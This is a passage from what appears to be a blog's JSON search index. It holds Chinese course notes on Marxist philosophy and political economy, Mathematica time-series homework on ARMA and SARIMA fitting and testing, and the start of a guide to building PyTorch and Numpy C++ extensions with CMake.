社会历史观的基本问题：社会存在与社会意识的关系：唯物主义历史观、唯心主义历史观。（第三章）p111 4、如何理解列宁的物质定义及其意义？P23世界的物质统一性原理及其意义。P29-30 列宁原话：物质是标志客观实在的哲学范畴，这种客观实在是人通过感觉感 知的，它不依赖于我们的感觉存在，为我们感觉所复写、摄影、反映。 意义：物质不依赖于人类的意识而存在，并能为人类的意识所反映的客观实在。 世界的物质统一性原理：世界是统一的，即世界的本原是一个；世界的统一性在于它的物质性，即世界统一的基础是物质，物质世界的统一性是多样性的统一。 1、自然界是物质的。 2、人类社会本质上是物质的。 3、人的意识统一于物质，意识是物质世界长期发展的产物。 意义： 理论意义：它是唯物哲学的基石，维物哲学的一系列原理和原则都是以此为根据和前提的，从而成为彻底的唯物主义一元论的世界观。 实践意义：它是我们从事一切工作的立足点，一切从实际出发是唯物主义一元论的根本要求。我们在任何时候、任何地点和任何条件下从事任何工作，都要按照世界的本来面目去人认识世界。（百度） 物质最本质的规定是客观实在性。 5、如何把握物质、运动、静止，时间和空间的含义、特点（或特性）及其相互关系？P24-25 物质的根本属性是运动。 物质世界的运动是绝对的，而物质在运动过程中又有某种相对的静止。 运动的绝对性体现运动的：变动性、无条件性。 运动的相对性体现运动的：稳定性、有条件性。 无条件的绝对运动和有条件的相对静止之间构成了对立统一的关系。 时间和空间：运动着的物质的基本存在形式。 时间：物质运动的持续性、顺序性，特点：一维性。 空间：物质运动的广延性、伸张性，特点：三维性。 物质、运动、时间、空间具有内在统一性。 6、意识的起源、涵义、本质及其作用？ P25-26 物质决定意识。 意识的起源： 1、自然界长期发展的产物。 2、社会历史发展的产物。 意识的本质：意识是人脑这样一种特殊物质的机能和属性，是客观世界的主观映象。 7、（新增）人工智能为何不能取代或超越人类智能？P28-29 1、人类意识是知情意的统一体。 2、社会性是人的意识所固有的本质属性，而人工智能不可能真正具备人类 的社会属性。 3、人类的自然语言是思维的物质外壳和意识的现实形式，而人工智能难以完全具备理解自然语言真实意义的能力。 8、意识的能动作用，主观能动性和客观规律性的辩证统一。P26-28 意识的能动作用：意识对物质具有反作用。 1、意识具有目的性和计划性。 2、意识具有创造性。 3、意识具有指导实践改造客观世界的作用。 4、意识具有调控人的行为和生理活动的作用。 辩证统一： 1、尊重客观规律是发挥主观能动性的前提。 2、只有充分发挥主观能动性才能正确认识和利用客观规律。 9、如何全面理解唯物辩证法的联系观和发展观及其意义？P32-33 联系：事物内部各要素之间和事物之间相互影响、相互制约、相互作用的关系。 联系的特点：客观性、普遍性、多样性、条件性。 发展观：新事物的产生和旧事物的灭亡。 10、如何理解社会的物质性、物质与意识的辩证关系是什么？P30 社会的物质性：人类社会的自然基础是物质的，人类获取生活资料的生产活动是物质的，物质资料的生产方式构成了人类社会存在和发展的基础，集中体现着人类社会的物质性。 物质与意识的辩证关系：物质决定意识，意识反作用于物质。 11、如何理解矛盾的同一性与斗争性的内涵及其辩证关系和意义？P35 矛盾的同一性与斗争性的内涵：相互依存、相互贯通、相互排斥、相互分离。 辩证关系：相互联结、相辅相成。 意义： 1、同一性是事物存在和发展的前提。 2、同一性使矛盾双方相互吸收有利于自己的因素。 3、同一性规定着事物转化的可能和发展的趋势。 4、矛盾双方的斗争促使双方的力量发生变化，造成双方力量发展的不平衡， 为对立面转化、事务的质变创造条件。 5、矛盾双方的斗争是一种矛盾统一体向另一种矛盾统一体过渡的决定性力 量。 12、唯物辩证法的“一点论”和“两点论”的关系是怎样的？P37 两点论和重点论的统一 两点论：看到矛盾双方的对立和统一。 重点论：把握主要矛盾、矛盾的主要方面。 看问题要全面的看，又要看主流、大势、发展趋势。 13、矛盾的普遍性和特殊性及其方法论意义是什么？P36-37 普遍性：矛盾存在于一切事物中，存在于一切事物发展的始终，旧的矛盾解 决了，新的矛盾产生了，事物在矛盾中运动。 特殊性：各个具体事物的矛盾、每一个矛盾的各个方面在发展的不同阶段上 各有各的特点。 共性与个性相统一的关系。 矛盾的普遍性和特殊性是辩证统一的关系。 14、“度”的含义及其方法论意义？P38 度：保持物质的稳定性的数量界限，事物的限度、幅度和范围。 意义：在认识和处理问题时要掌握适度原则。 15、量变和质变的辩证关系及其方法论意义是什么？P38 量变与质变的辩证关系： 1、量变是质变的必要条件。 2、质变是量变的必然结果，为新的量变开辟道路。 3、质变和量变是相互渗透的。 意义： 1、事物的发展处于量变阶段时，要踏实做好日常工作，为未来重大改变做准备。 2、当质变来临时，要果断地、不失时机的抓住机会，促成质变，使工作迈上新台阶。 16、辩证的否定观及其方法论意义是什么？P39 辩证的否定观：否定之否定规律。 1、否定是事物自我否定、自我发展，是事物内部矛盾运动的结果。 2、否定是事物发展的环节，是旧事物向新事物的转变，从旧质到新质的飞 跃。 3、否定是新旧事物联系的环节，新事物孕育产生于旧事物，通过否定联系 在一起。 4、辩证的否定的实质就是扬弃，新事物对旧事物批判又继承，克服其消极 因素保留积极因素。 意义：树立辩证的否定观，反对形而上学的肯定一切、否定一切，对事物采取科学分析的态度，使实践活动符合事物自我否定的辩证本性。正确的看待事物发展的过程，既要看到道路的曲折，更要看到前途的光明。 第二章 实践与认识及其发展规律 17、认识的本质是什么？辩证唯物主义认识论与旧唯物主义认识论的联系和区别。P69-72 认识的本质：主体在实践基础上对客体的能动反映。 主观唯心主义：人的认识是主观自生的，是生而知之的。 客观唯心主义：人的认识是上帝的启示或者某种客观精神的产物。 旧唯物主义认识论：以感性直观为基础，把人的认识看成是消极的、被动的反映和接收外界对象。 辩证唯物主义：主体在实践基础上对客体的能动反映。 辩证唯物主义的特点： 1、把实践的观点引入认识论。 2、把辩证法应用于反映论考察认识的发展过程。 18、实践和认识的关系是怎样的？P67-68 实践是认识的基础，实践在认识活动中起着决定性作用。 1、实践是认识的来源。 2、实践是认识的目的。 3、实践是认识发展的动力。 4、实践是检验认识真理性的唯一标准。 19、认识运动的基本规律，感性认识和理性认识的辩证关系。P72-79 认识运动的规律： 1、从实践到认识：由感性认识能动的飞跃到理性认识，第一次能动飞跃。 2、从认识到实践：由认识再回到实践去，第二次能动飞跃。 辩证关系： 1、理性认识依赖于感性认识。 2、感性认识有待发展和深化为理性认识。 3、感性认识和理性认识相互渗透、相互包含。 20、如何理解真理的属性：客观性、绝对性和相对性？P79-84 客观性：真理的内容是对客观事物及其规律的正确反映，真理中包含着不依 赖于人和人的意识的客观内容。 绝对性：真理主客观统一的确定性和发展的无限性。 相对性：人们在一定条件下对客观事物及其本质和发展规律的正确认识总是 有限度的、不完善的。 真理的相对性和绝对性的辩证统一。 21、真理与谬误的辩证关系。P85-86 辩证关系： 1、真理和谬误相互对立。 2、真理和谬误的对立又是相对的，在一定条件下，它们能够相互转化。 3、真理总是同谬误相比较而存在，相斗争而发展。 22、如何理解：实践是检验真理的唯一标准。P87-88 理解：由真理的本性和实践的特点决定 1、真理的本性：主观与客观相符合。只有社会实践这种，能够把主观认识 和客观事物联系和沟通起来，从而使人们能够把两者加以比较和对照的东西，才能充当检验真理的标准。 2、实践的特点：实践具有直接现实性。 第三章 人类社会及其发展规律 23、社会存在与社会意识及其辩证关系。P112-117 社会存在：社会物质生活条件，是社会生活的物质方面，主要包括：自然地理环境、人口因素、物质生产方式。 社会意识：是社会存在的反映，是社会生活的精神方面。 1、社会心理：低层次的社会意识，自发的、不系统的、不定型的社会意识，以感性认识为主。 2、社会意识形式：高层次的社会意识，自觉的、系统的、相对稳定的社会意识，以理性认识为主。 辩证关系：社会存在决定社会意识，社会意识是社会存在的反映，并反作用于社会存在。 社会意识是具体的、历史的，它依赖于社会存在，又有其相对独立性。 社会意识的独立性表现在： 1、社会意识和社会存在的发展具有不完全同步性和不平衡性。 2、社会意识的内部各种形式之间存在相互影响且各自具有历史继承性。 3、社会意识对社会存在具有能动的反作用，这是社会意识相对独立性的突出表现。 24、社会的基本规律及其意义。P120-129 社会的基本规律： 1、生产力与生产关系矛盾运动规律： 生产力基本要素：1.劳动资料2.劳动对象3.劳动者。科学技术是生产力的重要因素。 生产关系：1.以生产资料公有制为基础的生产关系。2.生产资料私有制为基础的生产关系。 生产力决定生产关系。 生产关系对生产力具有能动的反作用。 意义： 1、第一次科学地确立了生产力发展是社会进步的最高标准，并且把生产力和生产关系矛盾运动的规律作为判断时代变革的客观依据。 2、经济基础和上层建筑之间的矛盾运动规律： 经济基础：社会一定发展阶段的生产力所决定的生产关系的总和。 上层建筑：建立在一定经济基础上的意识形态以及与之适应的制度、组织和设施。 经济基础决定上层建筑，上层建筑反作用于经济基础，二者相互影响，相互作用。 25、社会意识的一般特点及其意义。P117 辩证关系：社会存在决定社会意识，社会意识是社会存在的反映，并反作用于社会存在。 社会意识是具体的、历史的，它依赖于社会存在，又有其相对独立性。 社会意识的独立性表现在： 1、社会意识和社会存在的发展具有不完全同步性和不平衡性。 2、社会意识的内部各种形式之间存在相互影响且各自具有历史继承性。 3、社会意识对社会存在具有能动的反作用，这是社会意识相对独立性的突出表现。 社会意识的能动作用是通过指导人们的实践活动实现的。 26、国家的涵义、产生、实质和一般职能？国体与政体的涵义及关系？P126-127 国家的涵义：按照地域来划分国民，并依靠强制性或暴力手段以及征收赋税来维系。 国家产生：阶级矛盾不可调和的产物。 国家实质：一个阶级统治另一个阶级的工具，是经济上占支配地位的阶级为了维护其根本利益而建立起来的强制性的暴力机关，以保证其在政治上也成为统治阶级。 国家一般职能：政治统治和社会管理。 国体：社会各阶级在国家中的地位。 政体：统治阶级实现其具体统治的具体组织形式。 关系：国体决定政体，政体服从于国体，政体为国体服务，并对保证国家的性质起重要作用。 27、社会物质生活条件（社会存在）的含义及其在社会历史发展中的作用？P112-113 含义：社会物质生活条件，是社会的物质方面，包括：自然地理环境、人口 因素和物质生产方式。 作用：物质生产方式是社会存在和发展的基础和决定性力量。 28、社会发展的动力有哪些？它们在社会发展中起何作用？P136-153 社会发展的动力： 1、社会基本矛盾。 作用： 1. 生产力是社会基本矛盾运动中最基本的动力因素，是人类社会发展和进步的最终决定性力量。 2. 生产力是社会进步的根本内容，是衡量社会进步的根本尺度。 3. 社会基本矛盾决定着社会中其他矛盾的存在和发展。 4. 社会基本矛盾具有不同的表现形式和解决方式，并从根本上影响和促进社会形态的变化和发展。 2、阶级斗争和社会革命。 作用：阶级斗争是阶级社会发展的直接动力。 社会革命： 1、实现社会形态更替的重要手段和决定性环节。 2、社会革命能充分发挥人民群众创造历史的积极性和伟大作用。 3、社会革命能极大地教育和锻炼包括革命阶级在内的广大群众人民。 4、无产阶级革命将为消除阶级对抗，并充分利用全人类的文明成果促进社会全面进步创造条件。 3、改革。 作用：一定程度上解决社会基本矛盾、促进生产力发展、推动社会进步的有效途径和手段。 4、科学技术。 作用：每一次科技革命，都不同程度的引起了生产方式、生活方式和思维方式的深刻变化和社会的巨大进步。 29、人民群众是历史的创造者，中国共产党的群众观点和群众路线。P159 群众观点：人民群众自己解放自己的观点、全心全意为人民服务的观点、一 切向人民群众负责的观点、虚心向人民群众学习的观点。 群众路线：一切为了群众，一切依靠群众，从群众中来，到群众中去。 30、科学社会主义诞生的标志是什么、全人类解放的根本体现是实现共产主义。（书上没有） 诞生标志：《共产党宣言》发表。 第四章 资本主义的本质及规律 （政治经济学部分） 1、什么是商品、什么是商品二因素？P169-170 商品：用来交换、能满足人的某种需要的劳动产品。 二因素：使用价值、价值。 2、什么是商品的使用价值、交换价值、价值？P169-170 使用价值：商品能满足人的某种需要的有用性。 交换价值：一种使用价值同另一种使用价值之间交换的量的关系或比例。 价值：凝结在商品中的无差别的一般人类劳动，即人的脑力和体力的耗费。 3、如何理解使用价值和价值的关系、交换价值和价值的关系？P170 使用价值和价值的关系：对立统一 对立：二者不可兼得，是相互排斥的，无法同时获得商品的使用价值和价值。 统一：作为商品，必须同时具有价值和使用价值。 交换价值和价值的关系：价值是交换价值的基础，交换价值是价值的表现形 式。 4、如何理解劳动的二重性？P170-171 具体劳动和抽象劳动 具体劳动：商品的使用价值，人和自然的关系，劳动的自然属性。 抽象劳动：商品的价值，商品生产者的社会关系，劳动的社会属性。 对立统一的关系。 统一：时间空间的统一 对立：反映劳动的不同属性。 5、商品的价值量是怎么决定的？商品价值量如何变动？P171-173 价值量决定：社会必要劳动时间。 变动：随劳动生产率的变化而变化。 6、价值规律的内容是什么？表现形式是什么？有什么作用（积极+消极）？P173-175 价值规律的内容：商品生产和商品交换的基本规律。商品的价值量由生产商 品的社会必要劳动时间决定，商品交换以价值量为基础，以等价交换为原则。 表现形式：商品的价格围绕商品的价值自发波动。 作用： 积极： 1、自发地调节生产资料和劳动力在社会各生产部门之间的分配比例。 2、自发的刺激社会生产力的发展。 3、自发的调节社会收入的分配。 消极： 1、导致社会资源浪费。 2、阻碍技术进步。 3、导致收入两极分化。 7、如何理解简单商品经济的基本矛盾？P176-178 私人劳动和社会劳动的矛盾是商品经济的基本矛盾。 8、什么是资本总公式的矛盾？货币是如何转化为资本的？P188-189 资本总公式：G-W-G’，资本总公式与商品交换原则是矛盾的，资本总公式 表明，资本在流通中创造了新的价值。 G是资本的货币，W是商品，G’是价值增值之后的货币。 货币转化为资本：一旦货币购买的劳动力带来剩余价值，货币就变成了资本。 9、如何理解劳动力商品的价值和使用价值？P189 劳动力的价值： 1、维持劳动者本人生存必需品的生活资料价值。 2、维持劳动者家属生存锁必需的生活资料的价值。 3、劳动者接收教育和训练所支出的费用。 劳动力的使用价值是价值的源泉，在消费中能够创造新的价值，而新的价值比劳动力本身的价值更大。 10、资本主义工资的实质是什么？P204 实质：工人的工资表现为劳动力的价值或价格。 11、如何理解资本主义生产过程的二重性？P192 二重性： 1、生产物质资料的劳动过程。 2、生产剩余价值的过程，价值增殖过程。 12、什么是不变资本、可变资本？P193-194 不变资本：以生产资料存在的资本。 可变资本：用来购买劳动力的那部分资本。 13、什么是资本有机构成？其变动趋势是什么？ 资本的有机构成：C（不变资本）：V（可变资本） 变动趋势：不断提高的趋势，不变资本所占比重增大，可变资本的比重减少。 14、如何计算m、mˊ？P194 资本主义商品的价值构成：W=c+v+m m’=m/v c：不变资本，v：可变资本，m：剩余价值，m’：剩余价值率。 15、什么是绝对剩余价值生产、相对剩余价值生产？P195-196 绝对剩余价值生产：必要劳动时间不变的条件下，由于延长工作日的长度或 提高劳动强度而生产的剩余价值。 相对剩余价值生产：工作日长度不变的条件下，通过缩短必要劳动时间而相 对延长剩余劳动时间所生产的剩余价值。 16、如何理解超额剩余价值？P196 超额剩余价值：企业由于提高劳动生产率而使商品的个别价格低于社会价格 的差额。 17、如何理解利润、平均利润率的形成、平均利润、生产价格？P205 利润：把剩余价值看作全部预付资本的产物或增加额。 平均利润率的形成：不同生产部门的资本家之间展开激烈的竞争，大量资本 必然从利润率低的部门转投到利润率高的部门，导致利润率平均化。 平均利润：按照平均利润率计算和获得的利润。 生产价格：商品价值的转化形式，是生产成本与平均利润之和。 18、什么是资本积累？P198 资本积累：把剩余价值转化为资本，剩余价值资本化。 19、什么是资本主义简单再生产、资本主义扩大再生产？P198 简单再生产：剩余价值完全用于个人消费，生产在原有规模的基础上重复进行。 扩大再生产：剩余价值不完全用于个人消费，将一部分转化为资本，用以购买追加的生产资料和劳动力，使生产在扩大的规模上重复进行。 20、什么是资本循环？P201 资本循环：资本从一种形式出发，经过一系列形式的变化，又回到原来出发 点的运动。 21、如何理解产业资本循环的三个阶段、三种职能形式和三种循环形式？P201-202 三个阶段和职能形式： 1、购买阶段：生产资料和劳动力的购买。产业资本执行的是货币资本的职 能。 2、生产阶段：生产资料和劳动力按比例结合在一起从事资本主义生产的阶 段。产业资本执行的是生产资本的职能。 3、售卖阶段：商品资本向货币资本的转化阶段。产业资本执行的是商品资 本的职能。 三种循环形式：货币资本的循环、生产资本的循环和商品资本的循环三种形式。 22、产业资本循环正常进行的前提条件是什么？P201-202 前提条件： 1、产业资本的三种职能形式必须在空间上并存。 2、产业资本的三种职能形式必须在时间上继起。 23、什么是资本周转？P202 资本周转：资本在运动中增值，周而复始的循环，不断的带来剩余价值，这种不断重复的资本循环。 24、什么是固定资本、流动资本？ 固定资本：厂房、机器设备等劳动资料的形式存在的生产资本。 流动资本：生产资本中用于购买原料、燃料、辅助材料等劳动对象和用于购买劳动力的部分。 25、如何计算预付总资本的周转次数？ 预付资本总周转次数=预付资本的各部分×相应周转次数/预付资本总额 =(固定资本周转价值总额+流动周转价值总额)/预付资本总额。 26、什么是社会总产品？P203 社会总产品：社会在一定时期所生产的全部物质资料的总和。 27、社会再生产的核心问题和理论前提是什么？P203 核心问题：社会总产品的实现问题。 理论前提：社会总产品在实物上得到替换，在价值上实现补偿，客观上要求两大部类内部各个产业部门之间和两大部类之间保持一定的比例关系。","tags":["马原","废话"],"categories":["课程"]},{"title":"时间序列分析作业 2","path":"/2023/12/20/TimeSeries-2/","content":"Problem 1 生成数据 12345model = ARMAProcess[{0.1, 0.12}, {-0.6, 0.7}, 1];SeedRandom[42];n = 1000;data = RandomFunction[model, {1001, n + 1000}];ListPlot[data, Filling -&gt; Axis] 用不同阶数 ARMA 模型进行拟合并计算 AIC, BIC 12345678results = Table[Module[{tsm}, tsm = TimeSeriesModelFit[data, {\"ARMA\", {p, q}}]; {tsm[\"AIC\"], tsm[\"BIC\"]}], {p, 1, 10}, {q, 1, 10}];aic = results[[All, All, 1]];bic = results[[All, All, 2]];ListPlot3D[aic, AxesLabel -&gt; {p, q, \"AIC\"}]ListPlot3D[bic, AxesLabel -&gt; {p, q, \"BIC\"}] AIC BIC 求最小阶数 12Position[aic, Min[aic]]Position[bic, Min[bic]] 均为 ARMA(2,2) 模型最合适. 重复以上过程 100 次, 并求阶数平均值标准差 1234567891011121314result100 = ParallelTable[Module[{data, results, aic, bic}, data = RandomFunction[model, {1001, n + 1000}]; results = Table[Module[{tsm}, tsm = TimeSeriesModelFit[data, {\"ARMA\", {p, q}}]; {tsm[\"AIC\"], tsm[\"BIC\"]}], {p, 1, 10}, {q, 1, 10}]; aic = results[[All, All, 1]]; bic = results[[All, All, 2]]; Flatten[{Position[aic, Min[aic]], Position[bic, Min[bic]]}] ], 100];TableForm[ Map[{N[Mean[#]], N[StandardDeviation[#]]} &amp;, Transpose[result100]], TableHeadings -&gt; {{\"AIC p\", \"AIC q\", \"BIC p\", \"BIC q\"}, {\"Mean\", \"StdDev\"}}] Problem 2 使用上一题的代码生成数据, 进行正态白噪声检验 123datanormal = Normal[data][[1, All, 2]];g3 = Sqrt[n/6] Skewness[datanormal]g4 = Sqrt[n/24] Kurtosis[datanormal] - 3 得到 , 否定序列是正态白噪声的假设. 使用逆序检验法检验平稳性 123456m = 20;xi = Mean[Partition[datanormal, m]];k = Length[xi];a = Sum[If[i &lt; j &amp;&amp; xi[[i]] &lt; xi[[j]], 1, 0], {i, 1, k - 1}, {j, i + 1, k}];z = (a - 1/4 k (k - 1))/Sqrt[(2 k^3 + 3 k^2 - 5 k)/72] 得到 , 在给定显著性水平 时认为序列无明显的趋势. 使用游程检验法检验平稳性 1234567mean = Mean[datanormal];n1 = Count[datanormal, _?(# &gt; mean &amp;)];n2 = Count[datanormal, _?(# &lt; mean &amp;)];r = Length[Split[Map[# &gt; mean &amp;, datanormal]]];er = N[(2 n1 n2)/(n1 + n2) + 1]dr = N[(2 n1 n2 (2 n1 n2 - 1))/(n^2 (n - 1))]z = (r - er)/Sqrt[dr] 计算得到 , 发现序列的游程过多了, 导致未通过游程检验方法 进行序列零均值检验. 取 1234\\[Gamma] = CovarianceFunction[data, {n - 1}]varx = Sum[\\[Gamma][Abs[i]], {i, -100, 100}]/101;meanSqrt[varx] 得到 , 则认为均值显著零 模型的识别与参数估计, 绘制自相关图 1234gamma = CovarianceFunction[data, {10}];Normal[gamma]ListPlot[{gamma, CovarianceFunction[model, {10}]}, Filling -&gt; Axis, PlotLegends -&gt; {\"模拟数据\", \"理论\"}] 绘制偏相关图 1234phi = PartialCorrelationFunction[data, {10}];Normal[phi]ListPlot[{phi, PartialCorrelationFunction[model, {10}]}, Filling -&gt; Axis, PlotLegends -&gt; {\"模拟数据\", \"理论\"}] 发现自相关函数在 2 步截尾, 偏相关函数拖尾, 有可能认为是 模型, 但还是认为是 ARMA 模型, 然后按照第一题的方法来定阶比较稳妥. Problem 3 123456model = SARIMAProcess[{0.1, 0.12}, 1, {-0.6}, {10, {0.7, -0.1}, 1, {0.8}}, 1];SeedRandom[42];n = 1000;data = RandomFunction[model, {1001, n + 1000}];ListPlot[data, Filling -&gt; Axis] 进行模型识别，绘制一阶差分的自相关图 123gamma = CovarianceFunction[Differences[data], {20}];Normal[gamma]ListPlot[gamma, Filling -&gt; Axis] 注意到数据有明显的季节性，且均值随时间明显地变化，则使用 SARIMA 模型是合适的， 使用 TimeSeriesModelFit 估计参数 12tsm = TimeSeriesModelFit[data, {\"SARIMA\", {{2, 1, 1}, {2, 1, 1}, 10}}]tsm[\"ParameterTable\"] 与理论模型差距明显. Problem 4 1234567data = TimeSeries[{184.61, 205.76, 229.31, 242.32, 275.23, 311, 358.06, 421.15, 458.23, 530.86, 659.69, 744.98, 890.95, 1016.31, 1177.27, 1486.08, 2001.41, 2443.21, 2871.65, 3241.47, 3474.09, 3649.12, 3928.2, 4293.49, 4725.01, 5333.09, 6379.63, 7385.1, 8690.24, 10562.39, 12601.23, 14151.28, 17185.48, 21026.68, 23872.8, 26260.77, 28536.7, 30103.1, 32680.5, 36980.2}, {1978}]ListLinePlot[data] 从图像上认为数据存在类似于指数增长的确定性趋势，考虑 1fit = FindFit[data, a + b E^(c (t - 1978)), {a, b, c}, t] 拟合得到 1{a -&gt; -688.723, b -&gt; 382.643, c -&gt; 0.118877} 看看残差 12res = data - Table[(a + b E^(c t)) /. fit, {t, Length[data]}];ListPlot[res, Filling -&gt; Axis] 并不算是平稳，但本来数据量就不多，将就吧 12tsm = TimeSeriesModelFit[TimeSeries[res]]tsm[\"BestFit\"] Mathematica 建议使用 SARIMA 来建模残量序列，残量序列确实具有一定的季节性 12SARIMAProcess[-4159.83, {2.75393, -5.90893}, 1, {-0.843746, \\-0.115202}, {12, {}, 3, {}}, 348735., {}] 但是由于数据量过少，难以估计许多参数. 使用更为简单的 ARMA 模型 12tsm = TimeSeriesModelFit[TimeSeries[res], \"ARMA\"]tsm[\"BestFit\"] 12ARMAProcess[-4.20369*10^-14, {1.36553, -0.673662}, {0.414017}, \\113312.]","tags":["时间序列"],"categories":["课程"]},{"title":"时间序列分析作业 1","path":"/2023/12/3/TimeSeries-1/","content":"Problem 1 首先计算自协方差函数. 记 比较系数 得到 当 时, 自协方差函数满足 则 有两个一重根 . 通解 满足边界条件 解得 直接求解 Yule-Walker 方程组 解得 Problem 2 1234model = ARMAProcess[{0.1, 0.12}, {-0.6, 0.7}, 1];SeedRandom[42];data = RandomFunction[model, {1001, 2000}]ListPlot[data, Filling -&gt; Axis] 动态数据散布图 计算自协方差值 1234gamma = CovarianceFunction[data, {10}];Normal[gamma]ListPlot[{gamma, CovarianceFunction[model, {10}]}, Filling -&gt; Axis, PlotLegends -&gt; {\"模拟数据\", \"理论\"}] 123{{0, 2.04243}, {1, -1.01932}, {2, 0.918475}, {3, -0.0514594}, {4, 0.0929306}, {5, -0.0248783}, {6, 0.0382432}, {7, -0.124687}, {8, 0.0575548}, {9, -0.129289}, {10, 0.0371609}} 自相关图 计算偏相关系数 1234phi = PartialCorrelationFunction[data, {10}];Normal[phi]ListPlot[{phi, PartialCorrelationFunction[model, {10}]}, Filling -&gt; Axis, PlotLegends -&gt; {\"模拟数据\", \"理论\"}] 123{{1, -0.49907}, {2, 0.267171}, {3, 0.390937}, {4, 0.0750153}, {5, -0.228319}, {6, -0.165794}, {7, -0.0293216}, {8, 0.095243}, {9, 0.0337099}, {10, -0.0334262}} 偏相关图 Problem 3 1234model = ARProcess[{1.4833, -0.8483, 0.2350, -0.0317, 0.0017}, 1];SeedRandom[42];data = RandomFunction[model, {501, 1000}];ListPlot[data, Filling -&gt; Axis] 数据散布图 估计自回归系数 12eproc = EstimatedProcess[data, ARProcess[{\\[Phi]1, \\[Phi]2, \\[Phi]3, \\[Phi]4, \\[Phi]5}, \\[Sigma]]] 12ARProcess[{1.45937, -0.847174, 0.238211, 0.00292631, -0.0436659}, 1.0762] 近似认为 时, 取出错概率为, 则自回归系数的置信区间为 1Quantile[NormalDistribution[0, Sqrt[1/N]], 1 - \\[Alpha]/2] 若取 , 可得置信区间为 根据此判据认为估计的 AR 模型 应取 3. 但原模型中本身 较小, 为了得到更可信而准确的结果, 应加大模拟时长或模拟更多路径的数据. Problem 4 1234model = MAProcess[{-0.6, 0.7}, 1];SeedRandom[42];data = RandomFunction[model, {1001, 2000}];ListPlot[data, Filling -&gt; Axis] 数据散布图 矩估计 二阶 MA 模型, 认为 数值求解方程组 12345678\\[Gamma] = CovarianceFunction[data, {2}];sys = { \\[Gamma][0] == \\[Sigma]^2 (1 + \\[Theta]1^2 + \\[Theta]2^2), \\[Gamma][1] == \\[Sigma]^2 (\\[Theta]1 + \\[Theta]1 \\[Theta]2), \\[Gamma][2] == \\[Sigma]^2 \\[Theta]2, \\[Sigma] &gt;= 0 };NSolve[sys, {\\[Sigma], \\[Theta]1, \\[Theta]2}, Reals] 得到的两组解都满足弱平稳条件, 其中第一组解更接近理论模型. 逆相关函数 首先利用 Y-W 方程估计二阶 AR 模型参数 12345\\[Gamma] = CovarianceFunction[data, {2}];\\[Phi] = LinearSolve[{{\\[Gamma][0], \\[Gamma][1]}, {\\[Gamma][1], \\[Gamma][ 0]}}, {\\[Gamma][1], \\[Gamma][2]}]\\[Sigma]2 = \\[Gamma][0] - \\[Phi] . {\\[Gamma][1], \\[Gamma][2]} 然后计算逆相关函数 123\\[Gamma]0 = 1/\\[Sigma]2 (1 + \\[Phi][[1]]^2 + \\[Phi][[2]]^2)\\[Gamma]1 = 1/\\[Sigma]2 (-\\[Phi][[1]] + \\[Phi][[1]] \\[Phi][[2]])\\[Gamma]2 = -(1/\\[Sigma]2) \\[Phi][[2]] 求解 Y-W 方程得二阶 MA 模型参数 1234\\[Theta] = LinearSolve[{{\\[Gamma]0, \\[Gamma]1}, {\\[Gamma]1, \\[Gamma]0}}, {\\\\[Gamma]1, \\[Gamma]2}]\\[Sigma]2 = \\[Gamma]0 - \\[Theta] . {\\[Gamma]1, \\[Gamma]2} 极大似然估计 123eproc = EstimatedProcess[data, MAProcess[{\\[Theta]1, \\[Theta]2}, \\[Sigma]], ProcessEstimator -&gt; \"MaximumLikelihood\"] 1MAProcess[{-0.617286, 0.712392}, 1.06552] 置信区间为 1Quantile[NormalDistribution[0, Sqrt[1/N]], 1 - \\[Alpha]/2] 若取 , 可得置信区间为","tags":["时间序列"],"categories":["课程"]},{"title":"使用 CMake 构建 PyTorch 和 Numpy C++ 拓展","path":"/2023/7/12/Python-CMake/","content":"使用 CMake 构建 PyTorch 和 Numpy C++ 拓展能适应更复杂的项目并使用灵活的编译选项. 然而, 许多互联网上的教程中的方法已经不能在较新版本的 PyTorch 和 CMake 使用. 本文介绍了几种作者在近期测试成功的使用 CMake 构建 PyTorch 和 Numpy 拓展的方案. 需要注意的是, 许多 CMake 配置文件都包含了对某个依赖历史版本的问题引入的 Workaround, 不能在新版本正常工作, 本文所述的方法也有极大概率无法在将来工作. 下文给出三个 CMakeLists.txt 的例子, 其中问题的解决方案是通用的. 使用原生 Python.h 与 numpy.h https://github.com/src-d/kmcuda/blob/master/src/CMakeLists.txthttps://github.com/src-d/kmcuda/blob/master/src/CMakeLists.txt kmcuda 项目通过原生的 Python 和 Numpy 头文件实现了从 Python 调用 C++ 库, 并通过 Numpy ndarray 传递数据, 通过手动在 CMake 文件中配置 CUDA 相关静态链接库来使用 CUDA 加速计算. 原仓库的 CMakeLists.txt 文件无法在 Windows 上正常使用, 其 CUDA 命令行参数和 macOS 上的 Workaround 也很可能过时. https://github.com/Duanyll/kmcuda/blob/windows-build/src/CMakeLists.txthttps://github.com/Duanyll/kmcuda/blob/windows-build/src/CMakeLists.txt 这个分支的 CMakeLists.txt 文件能在 Windows 上工作. 完整 CMakeLists.txt12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364cmake_minimum_required(VERSION 3.16 FATAL_ERROR)project(KMCUDA CXX C CUDA)set(CMAKE_MODULE_PATH ${CMAKE_HOME_DIRECTORY}/cmake)set (CMAKE_CXX_STANDARD 11)set (CMAKE_CXX_STANDARD_REQUIRED ON)set (CMAKE_CUDA_STANDARD 11)set (CMAKE_CUDA_STANDARD_REQUIRED ON)find_package(OpenMP REQUIRED)if (MSVC) set (OpenMP_CXX_FLAGS \"${OpenMP_CXX_FLAGS} -openmp:experimental\")endif()set (CMAKE_CXX_FLAGS \"${CMAKE_CXX_FLAGS} ${OpenMP_CXX_FLAGS}\")find_package(CUDAToolkit REQUIRED)if (NOT CUDA_ARCH) set(CUDA_ARCH 86)endif()set(CMAKE_CUDA_ARCHITECTURES ${CUDA_ARCH})if (NOT DISABLE_PYTHON) find_package(PythonInterp 3 REQUIRED) find_package(PythonLibs 3 REQUIRED) if (NOT NUMPY_INCLUDES) execute_process(COMMAND ${PYTHON_EXECUTABLE} -c \"import numpy; print(numpy.get_include())\" OUTPUT_VARIABLE NUMPY_INCLUDES) endif()endif()if (NOT DISABLE_R) find_package(R)endif()set(SOURCE_FILES kmcuda.cc kmcuda.h wrappers.h private.h fp_abstraction.h tricks.cuh metric_abstraction.h kmeans.cu knn.cu transpose.cu)if (PYTHONLIBS_FOUND) list(APPEND SOURCE_FILES python.cc)endif()if (R_FOUND) list(APPEND SOURCE_FILES r.cc)endif()add_library(KMCUDA SHARED ${SOURCE_FILES})add_compile_definitions(_MWAITXINTRIN_H_INCLUDED _FORCE_INLINES)add_compile_definitions(CUDA_ARCH=${CUDA_ARCH})target_link_libraries(KMCUDA 